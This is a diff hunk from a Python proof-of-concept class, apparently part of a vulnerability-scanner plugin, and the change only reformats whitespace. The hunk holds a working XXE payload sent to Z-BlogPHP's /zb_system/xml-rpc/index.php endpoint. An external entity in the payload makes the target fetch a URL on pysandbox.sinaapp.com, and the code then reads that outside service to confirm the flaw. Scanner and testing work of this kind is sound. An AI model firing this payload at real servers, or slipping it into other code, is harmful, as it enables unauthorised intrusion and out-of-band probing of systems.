@@ -36,14 +36,14 @@ class Poc(ABPoc):
             payload = '/zb_system/xml-rpc/index.php'
             url = '{target}'.format(target=self.target)+payload
             raw = '''POST /zb_system/xml-rpc/index.php HTTP/1.1
-                    Content-Length: 182
-                    Connection: Keep-Alive
-                    Accept: */*
-                    User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)
-                    Host: liushumeng.com
-                    Content-Type: application/x-www-form-urlencoded
+Content-Length: 182
+Connection: Keep-Alive
+Accept: */*
+User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)
+Host: liushumeng.com
+Content-Type: application/x-www-form-urlencoded
 
-                    <?xml version="1.0" encoding="UTF-8" standalone="no" ?><!DOCTYPE root [<!ENTITY % remote SYSTEM "http://pysandbox.sinaapp.com/kv?act=set&k={key}&v=testvul">%remote;]></root>'''
+<?xml version="1.0" encoding="UTF-8" standalone="no" ?><!DOCTYPE root [<!ENTITY % remote SYSTEM "http://pysandbox.sinaapp.com/kv?act=set&k={key}&v=testvul">%remote;]></root>'''
             key = arg.replace('http://','').replace('/','').replace(':','')
             code, head, res, errcode, _ = hh.http(url,raw=raw.replace('{key}',key))      
             keyurl = 'http://pysandbox.sinaapp.com/kv?act=get&k=%s' %(key)
